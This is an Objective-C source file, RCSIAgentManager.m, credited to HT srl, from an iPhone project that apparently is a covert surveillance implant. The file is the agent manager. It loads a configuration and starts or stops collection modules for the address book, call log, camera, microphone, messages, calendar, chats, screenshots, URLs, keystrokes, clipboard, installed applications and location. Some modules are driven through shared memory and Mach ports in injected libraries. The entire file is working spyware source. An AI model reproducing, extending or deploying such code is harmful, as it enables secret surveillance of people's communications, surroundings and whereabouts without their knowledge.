//
//  RCSIAgentManager.m
//  RCSIphone
//
//  Created by kiodo on 11/04/12.
//  Copyright 2012 HT srl. All rights reserved.
//
#import <mach/mach.h>
#import <CoreLocation/CoreLocation.h>
#import <objc/runtime.h>

#import "RCSIAgentManager.h"
#import "RCSICommon.h"
#import "RCSIConfManager.h"
#import "RCSISharedMemory.h"
#import "RCSIThreadSupport.h"

#import "RCSIAgentAddressBook.h"
#import "RCSIAgentApplication.h"
#import "RCSIAgentCalendar.h"
#import "RCSIAgentCallList.h"
#import "RCSIAgentCamera.h"
#import "RCSIAgentDevice.h"
#import "RCSIAgentMessages.h"
#import "RCSIAgentMicrophone.h"
#import "RCSIAgentScreenshot.h"
#import "RCSIAgentURL.h"
#import "RCSIAgentChat.h"
#import "RCSIAgentPositionSupport.h"

NSString *kRunLoopAgentManagerMode = @"kRunLoopAgentManagerMode";

@implementation _i_AgentManager

@synthesize notificationPort;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

- (id)init
{
    self = [super init];
    if (self) 
      {
        NSNumber *agtAB = [NSNumber numberWithInt:AGENT_ADDRESSBOOK];
        NSNumber *agtCL = [NSNumber numberWithInt:AGENT_CALL_LIST];
        NSNumber *agtCM = [NSNumber numberWithInt:AGENT_CAM];
        NSNumber *agtDV = [NSNumber numberWithInt:AGENT_DEVICE];
        NSNumber *agtMS = [NSNumber numberWithInt:AGENT_MESSAGES];
        NSNumber *agtMC = [NSNumber numberWithInt:AGENT_MICROPHONE];
        NSNumber *agtOR = [NSNumber numberWithInt:AGENT_ORGANIZER];
        NSNumber *agtIM = [NSNumber numberWithInt:AGENT_IM];
        mInternalAgentsSet = [[NSSet alloc] initWithObjects: (id)agtAB,
                                                             (id)agtCL,
                                                             (id)agtCM,
                                                             (id)agtDV, 
                                                             (id)agtMS,
                                                             (id)agtMC,
                                                             (id)agtOR,
                                                             (id)agtIM,
                                                             nil];
        mAgentMessageQueue = [[NSMutableArray alloc] initWithCapacity:0];
        agentsList = [[NSMutableArray alloc] initWithCapacity:0];
      }
    
    return self;
}

- (void)dealloc
{
  [mAgentMessageQueue release];
  [mInternalAgentsSet release];
  [agentsList release];
  [super dealloc];
}



#pragma mark -
#pragma mark Main runloop
#pragma mark -

typedef struct _coreMessage_t
{
  mach_msg_header_t header;
  uint dataLen;
} coreMessage_t;

- (void)dispatchMsgToCore:(u_int)aType
                    param:(u_int)aParam
{
  shMemoryLog params;
  params.agentID  = aType;
  params.flag     = aParam;
  
  NSData *msgData = [[NSData alloc] initWithBytes: &params 
                                           length: sizeof(shMemoryLog)];
  
  [_i_SharedMemory sendMessageToCoreMachPort: msgData];
  
  [msgData release];
}

- (BOOL)addMessage: (NSData*)aMessage
{
  // messages removed by handleMachMessage
  @synchronized(mAgentMessageQueue)
  {
    [mAgentMessageQueue addObject: aMessage];
  }
  
  return TRUE;
}

- (void) handleMachMessage:(void *) msg 
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  coreMessage_t *coreMsg = (coreMessage_t*)msg;
  
  NSData *theData = [NSData dataWithBytes: ((u_char*)msg + sizeof(coreMessage_t))  
                                   length: coreMsg->dataLen];
  
  [self addMessage: theData];
  
  [pool release];
}

- (id)getAgentInstanceForID:(u_int)agentID
{
  id agentInstance = nil;
  
  for (int i=0; i < [agentsList count]; i++) 
    {
      id tmpInstance = [agentsList objectAtIndex:i];
      if ([tmpInstance mAgentID] == agentID)
        {
          agentInstance = tmpInstance;
          break;
        }
    }
  
  return agentInstance;
}

- (void)startRemoteAgent:(u_int)agentID
{
  id agentInstance = [self getAgentInstanceForID: agentID];
  
  if (agentInstance == nil)
    return;
  
  /*
   * check if we can run  position remote agents
   */
  if (agentID == AGENT_POSITION)
  {
    UInt32 *flag = (UInt32*)[[agentInstance mAgentConfiguration] bytes];
    [[_i_AgentPositionSupport sharedInstance] checkAndSetupLocationServices: flag];
  }
  
  time_t tmpCfgId = [[_i_ConfManager sharedInstance] mConfigTimestamp];
                     
  _i_DylibBlob *tmpBlob 
     = [[_i_DylibBlob alloc] initWithType:agentID 
                                    status:1 
                                attributes:DYLIB_AGENT_START_ATTRIB 
                                      blob:[agentInstance mAgentConfiguration]
                                  configId:tmpCfgId];
  
  [[_i_SharedMemory sharedInstance] putBlob: tmpBlob];
  [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
  
  [tmpBlob release];
}

- (void)stopRemoteAgent:(u_int)agentID
{
  id agentInstance = [self getAgentInstanceForID: agentID];
  
  if (agentInstance == nil)
    return;
  
  _i_DylibBlob *tmpBlob 
  = [[_i_DylibBlob alloc] initWithType:agentID 
                                  status:1 
                              attributes:DYLIB_AGENT_STOP_ATTRIB 
                                    blob:[agentInstance mAgentConfiguration]
                                configId:[[_i_ConfManager sharedInstance] mConfigTimestamp]];
  
  [[_i_SharedMemory sharedInstance] putBlob: tmpBlob];  
  [[_i_SharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
  
  [tmpBlob release];
}

- (void)runAnAgent:(id)agentInstance name:(NSString*)threadName
{
  if ([agentInstance mAgentStatus] != AGENT_STATUS_STOPPED)
    return;
  
  _i_Thread *agentThread = [[_i_Thread alloc] 
                                  initWithTarget: agentInstance
                                        selector: @selector(startAgent) 
                                          object: nil
                                         andName: threadName];
  
  [agentInstance setMThread: agentThread];
  
  [agentInstance setMAgentStatus: AGENT_STATUS_RUNNING];
  
  [agentThread start];
  
  [agentThread release];
  
}

- (void)tryStartAgent:(u_int)agentID
{
  NSNumber *agentNum = [NSNumber numberWithInt:agentID];
  
  if ([mInternalAgentsSet containsObject:agentNum] == TRUE)
    {
      NSString *threadName  = [NSString stringWithFormat: @"AGENT_%.4X", agentID];
      id agentInstance      = [self getAgentInstanceForID: agentID];

      if (agentInstance != nil && [agentInstance mAgentStatus] == AGENT_STATUS_STOPPED)
        {
          [self runAnAgent: agentInstance name:threadName];
        }
    }
  else
    [self startRemoteAgent: agentID];
}

- (void)tryStopAgent:(u_int)agentID
{
  NSNumber *agentNum = [NSNumber numberWithInt:agentID];
  
  if ([mInternalAgentsSet containsObject:agentNum] == TRUE)
    {
      [[self getAgentInstanceForID: agentID] stopAgent];
    }
  else
    {
      [self stopRemoteAgent: agentID];
    }
}

- (BOOL)processMessage:(NSData *)aData
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if (aData == nil)
    return FALSE;
  
  shMemoryLog *aMessage = (shMemoryLog*)[aData bytes];
  
  switch (aMessage->agentID) 
  {
    case CORE_NOTIFICATION:
    {
      if (aMessage->flag == CORE_NEED_RESTART || 
          aMessage->flag == CORE_NEED_STOP)
        {
          agentManagerStatus = AGENT_MANAGER_STOPPING;
          [pool release];
          return FALSE;
        }
      break;
    }
    case ACTION_START_AGENT:
    {
      u_int agentID = aMessage->flag;
      
      [self tryStartAgent: agentID];
      
      break;
    }
    case ACTION_STOP_AGENT:
    {
      u_int agentID = aMessage->flag;
    
      [self tryStopAgent: agentID];
    
      break;
    }
  }
  
  [pool release];
  
  return TRUE;
}

- (int)processIncomingMessages
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *tmpMessages;
  
  @synchronized(mAgentMessageQueue)
  {
    tmpMessages = [[mAgentMessageQueue copy] autorelease];
    [mAgentMessageQueue removeAllObjects];
  }
  
  int msgCount = [tmpMessages count];
  
  for (int i=0; i < msgCount; i++)
    if ([self processMessage: [tmpMessages objectAtIndex:i]] == FALSE)
      {
        [pool release];
        return msgCount;
      }
  
  [pool release];
  
  return msgCount;
}

- (void)agentManagerRunLoop
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  agentManagerStatus = AGENT_MANAGER_RUNNING;
  
  NSRunLoop *agentManagerRunLoop = [NSRunLoop currentRunLoop];
  
  notificationPort = [[NSMachPort alloc] init];
  [notificationPort setDelegate: self];
  
  [agentManagerRunLoop addPort: notificationPort 
                       forMode: kRunLoopAgentManagerMode];
  
  while (agentManagerStatus == AGENT_MANAGER_RUNNING)
    {
      NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
      [agentManagerRunLoop runMode: kRunLoopAgentManagerMode 
                        beforeDate: [NSDate dateWithTimeIntervalSinceNow:0.750]];
    
      [self processIncomingMessages];   
    
      [pool release];
    }

  [agentManagerRunLoop removePort: notificationPort 
                          forMode: kRunLoopAgentManagerMode];
  
  [notificationPort release];
  
  @synchronized(mAgentMessageQueue)
  {
    [mAgentMessageQueue removeAllObjects];
  }
  
  [self stop];
  
  [pool release];
}

- (id)initAgentInstance:(NSNumber*)aType withData:(NSData*)aData
{
  int type = [aType intValue];
  id agentInstance = nil;
  
  switch (type) 
  {
    case AGENT_ADDRESSBOOK:
    {
      agentInstance = [[_i_AgentAddressBook alloc] initWithConfigData: aData];
      break;
    }
    case AGENT_CALL_LIST:
    {
      agentInstance = [[_i_AgentCallList alloc] initWithConfigData: aData];
      break;
    }
    case AGENT_CAM:
    {
      agentInstance = [[_i_AgentCamera alloc] initWithConfigData: aData];
      break;
    }
    case AGENT_DEVICE:
    {
      agentInstance = [[_i_AgentDevice alloc] initWithConfigData: aData];
      break;
    }
    case AGENT_MESSAGES:
    {
      agentInstance = [[_i_AgentMessages alloc] initWithConfigData: aData];
      break;
    }
    case AGENT_MICROPHONE:
    {
      agentInstance = [[_i_AgentMicrophone alloc] initWithConfigData: aData];
      break;
    }
    case AGENT_ORGANIZER:
    {
      agentInstance = [[_i_AgentCalendar alloc] initWithConfigData: aData];
      break;
    }
    case AGENT_IM:
    {
      agentInstance = [[_i_AgentChat alloc] init];
      break;
    }
    case AGENT_SCREENSHOT:
    {
      // remote agent
      agentInstance = [[_i_Agent alloc] initWithConfigData:nil];
      [agentInstance setMAgentID: type];
      break;
    }
    case AGENT_URL:
    {
      // remote agent
      agentInstance = [[_i_Agent alloc] initWithConfigData:nil];
      [agentInstance setMAgentID: type];
      break;
    }
    case AGENT_KEYLOG:
    {
      // remote agent
      agentInstance = [[_i_Agent alloc] initWithConfigData:nil];
      [agentInstance setMAgentID: type];
      break;
    }
    case AGENT_CLIPBOARD:
    {
      // remote agent
      agentInstance = [[_i_Agent alloc] initWithConfigData:nil];
      [agentInstance setMAgentID: type];
      break;
    }
    case AGENT_APPLICATION:
    {
      // remote agent
      agentInstance = [[_i_Agent alloc] initWithConfigData:nil];
      [agentInstance setMAgentID: type];
      break;
    }
    case AGENT_POSITION:
    {
      // remote agent
      agentInstance = [[_i_Agent alloc] initWithConfigData:aData];
      [agentInstance setMAgentID: type];
      break;
    }
    default:
      break;
  }
  
  return agentInstance;
}

- (void)initAgents:(NSArray*)agentsConfig
{
  for (int i=0; i < [agentsConfig count]; i++)
    {
      NSNumber *type  = [[agentsConfig objectAtIndex:i] objectForKey: @"agentID"];
      NSData   *aData = [[agentsConfig objectAtIndex:i] objectForKey: @"data"];
    
      id agentInstance = [self initAgentInstance:type withData:aData];
      
      if (agentInstance != nil)
        {
          [agentsList addObject: agentInstance];
          [agentInstance release];
        }
    }
}

- (BOOL)start
{  
  NSArray *agentsConfig = [[_i_ConfManager sharedInstance] agentsArrayConfig];
  
  if (agentsConfig == nil)
    return FALSE;
  
  [self initAgents:agentsConfig];
  
  [agentsConfig release];
  
  [NSThread detachNewThreadSelector: @selector(agentManagerRunLoop) 
                           toTarget: self 
                         withObject: nil];
  
  return TRUE;
}

- (BOOL)yetRunningAgents
{
  for (int i=0; i < [agentsList count]; i++) 
    {
      id agent = [agentsList objectAtIndex:i];
    
      if (agent != nil && [agent mAgentStatus] != AGENT_STATUS_STOPPED)
        return TRUE;
    }
  
  return FALSE;
}

- (void)stopAllRunningAgents
{
  for (int i=0; i < [agentsList count]; i++) 
    {
      id agent = [agentsList objectAtIndex:i];
    
      if (agent != nil)
        {
          [agent setMAgentStatus: AGENT_STATUS_STOPPING];
          [[agent mThread] cancel];
        }
    }
  
  do {
      usleep(250000);
  } while ([self yetRunningAgents] == TRUE);
}

- (void)stop
{
  [self stopAllRunningAgents];
  [self dispatchMsgToCore:CORE_NOTIFICATION param:CORE_AGENT_STOPPED];
}

@end
